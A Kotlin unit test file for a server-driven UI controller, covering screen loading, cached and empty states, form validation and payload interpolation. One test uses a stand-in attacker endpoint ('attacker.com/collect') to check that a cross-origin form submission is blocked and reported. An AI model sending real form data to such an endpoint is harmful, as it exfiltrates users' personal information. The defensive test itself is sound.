package io.heimui.core

import io.heimui.core.domain.evaluator.HeimValidatorRegistry
import io.heimui.core.domain.model.HeimScreenResponse
import io.heimui.core.domain.model.HeimValue
import io.heimui.core.domain.model.action.SubmitFormAction
import io.heimui.core.domain.model.component.ContainerComponent
import io.heimui.core.domain.model.component.TextComponent
import io.heimui.core.domain.model.validation.ValidationRule
import io.heimui.core.domain.model.validation.ValidationType
import io.heimui.core.domain.repository.HeimScreenRepository
import io.heimui.core.domain.repository.HeimScreenResult
import io.heimui.core.domain.repository.HeimSubmitResult
import io.heimui.core.presentation.state.HeimScreenController
import io.heimui.core.presentation.state.HeimScreenState
import io.heimui.core.presentation.state.HeimStateManager
import io.heimui.core.presentation.telemetry.HeimTelemetryEvent
import io.heimui.core.presentation.telemetry.HeimTelemetryObserver
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flowOf
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * These tests exist because the load and submit pipeline used to live inside the `HeimScreen`
 * composable, where it was unreachable without a Compose UI harness the project does not have.
 */
class HeimScreenControllerTest {

    private fun screen(id: String, title: String) = HeimScreenResponse(
        id = id,
        title = title,
        root = ContainerComponent(
            id = "root",
            children = listOf(TextComponent(id = "t", text = title))
        )
    )

    private class FakeRepository(
        private val results: List<HeimScreenResult> = emptyList(),
        private val submitResult: HeimSubmitResult = HeimSubmitResult.Success(message = "ok")
    ) : HeimScreenRepository {
        var submittedEndpoint: String? = null
        var submittedPayload: Map<String, HeimValue>? = null
        var submitCallCount = 0

        override fun getScreen(screenId: String, queryParams: Map<String, String>):
            Flow<HeimScreenResult> = flowOf(*results.toTypedArray())

        override suspend fun submitForm(
            endpoint: String,
            method: String,
            payload: Map<String, HeimValue>?
        ): HeimSubmitResult {
            submitCallCount++
            submittedEndpoint = endpoint
            submittedPayload = payload
            return submitResult
        }
    }

    private class RecordingTelemetry : HeimTelemetryObserver {
        val events = mutableListOf<HeimTelemetryEvent>()
        override fun onEvent(event: HeimTelemetryEvent) { events += event }
    }

    @Test
    fun `a failed refresh keeps cached content on screen instead of replacing it with an error`() =
        runTest {
            val telemetry = RecordingTelemetry()
            val repo = FakeRepository(
                listOf(
                    HeimScreenResult.Success(screen("s", "Cached"), isStale = true),
                    HeimScreenResult.Stale(screen("s", "Cached"), reason = "offline")
                )
            )
            val controller = HeimScreenController(
                screenId = "s",
                repository = repo,
                scope = this,
                telemetryObserver = telemetry
            )

            controller.load()
            testScheduler.advanceUntilIdle()

            // The user must still see the cached screen, not an error page.
            val state = assertIs<HeimScreenState.Content>(controller.screenState.value)
            assertEquals("Cached", state.screen.title)
            assertTrue(state.isStale)
            assertTrue(telemetry.events.any { it is HeimTelemetryEvent.ScreenRefreshFailed })
        }

    @Test
    fun `an error with no content still surfaces as an error state`() = runTest {
        val controller = HeimScreenController(
            screenId = "s",
            repository = FakeRepository(listOf(HeimScreenResult.Error("no network"))),
            scope = this
        )
        controller.load()
        testScheduler.advanceUntilIdle()

        assertEquals("no network", assertIs<HeimScreenState.Error>(controller.screenState.value).message)
    }

    @Test
    fun `submission is blocked when a field the user never touched fails validation`() = runTest {
        val telemetry = RecordingTelemetry()
        val repo = FakeRepository()
        val controller = HeimScreenController(
            screenId = "s",
            repository = repo,
            scope = this,
            telemetryObserver = telemetry
        )
        val stateManager = HeimStateManager(screenId = "s")
        // Registered but never filled in: per-field validation has never run for it.
        stateManager.registerField(
            "email",
            listOf(ValidationRule(ValidationType.REQUIRED, errorMessage = "Email is required"))
        )

        val attempted = controller.submitForm(
            action = SubmitFormAction(endpoint = "/v1/signup"),
            stateManager = stateManager
        )

        assertFalse(attempted)
        assertEquals(0, repo.submitCallCount, "nothing may reach the network when the form is invalid")
        assertEquals("Email is required", stateManager.fieldErrors.value["email"])
    }

    @Test
    fun `a valid form is submitted with state placeholders interpolated and typed`() = runTest {
        val telemetry = RecordingTelemetry()
        val repo = FakeRepository()
        val controller = HeimScreenController(
            screenId = "s",
            repository = repo,
            scope = this,
            telemetryObserver = telemetry
        )
        val stateManager = HeimStateManager(screenId = "s")
        stateManager.registerField(
            "email",
            listOf(ValidationRule(ValidationType.EMAIL, errorMessage = "Invalid email"))
        )
        stateManager.updateValue("email", "user@heimui.io")
        stateManager.updateValue("amount", "500")

        val attempted = controller.submitForm(
            action = SubmitFormAction(
                endpoint = "/v1/transfer",
                payload = mapOf(
                    "email" to HeimValue.Str("{{state.email}}"),
                    "amount" to HeimValue.Str("{{state.amount}}"),
                    "source" to HeimValue.Str("mobile")
                )
            ),
            stateManager = stateManager
        )

        assertTrue(attempted)
        assertEquals("/v1/transfer", repo.submittedEndpoint)
        assertEquals(HeimValue.Str("user@heimui.io"), repo.submittedPayload?.get("email"))
        // A numeric state value must reach the backend as a number, not as the string "500".
        assertEquals(HeimValue.Int64(500), repo.submittedPayload?.get("amount"))
        assertEquals(HeimValue.Str("mobile"), repo.submittedPayload?.get("source"))
        assertTrue(telemetry.events.any { it is HeimTelemetryEvent.FormSubmitted })
    }

    @Test
    fun `a blocked submission is reported and never treated as a success`() = runTest {
        val telemetry = RecordingTelemetry()
        val controller = HeimScreenController(
            screenId = "s",
            repository = FakeRepository(submitResult = HeimSubmitResult.Blocked("cross-origin")),
            scope = this,
            telemetryObserver = telemetry
        )

        controller.submitForm(
            action = SubmitFormAction(endpoint = "https://attacker.com/collect"),
            stateManager = HeimStateManager(screenId = "s")
        )

        assertTrue(telemetry.events.any { it is HeimTelemetryEvent.SubmissionBlocked })
        assertFalse(telemetry.events.any { it is HeimTelemetryEvent.FormSubmitted && it.success })
    }

    @Test
    fun `a screen whose root renders nothing resolves to Empty rather than a blank page`() = runTest {
        val empty = HeimScreenResponse(id = "s", root = ContainerComponent(id = "root"))
        val controller = HeimScreenController(
            screenId = "s",
            repository = FakeRepository(listOf(HeimScreenResult.Success(empty))),
            scope = this
        )
        controller.load()
        testScheduler.advanceUntilIdle()

        assertIs<HeimScreenState.Empty>(controller.screenState.value)
    }

    @Test
    fun `an unregistered custom validator blocks submission and is reported`() = runTest {
        val telemetry = RecordingTelemetry()
        val repo = FakeRepository()
        val controller = HeimScreenController(
            screenId = "s",
            repository = repo,
            scope = this,
            telemetryObserver = telemetry
        )
        val stateManager = HeimStateManager(screenId = "s")
        stateManager.registerField(
            "nit",
            listOf(ValidationRule(ValidationType.CUSTOM, value = "COLOMBIAN_NIT", errorMessage = "Invalid NIT"))
        )
        stateManager.updateValue("nit", "900123456")

        val attempted = controller.submitForm(
            action = SubmitFormAction(endpoint = "/v1/kyc"),
            stateManager = stateManager,
            validatorRegistry = HeimValidatorRegistry()
        )

        assertFalse(attempted)
        assertNull(repo.submittedEndpoint)
        assertTrue(telemetry.events.any { it is HeimTelemetryEvent.ValidatorMissing })
    }
}
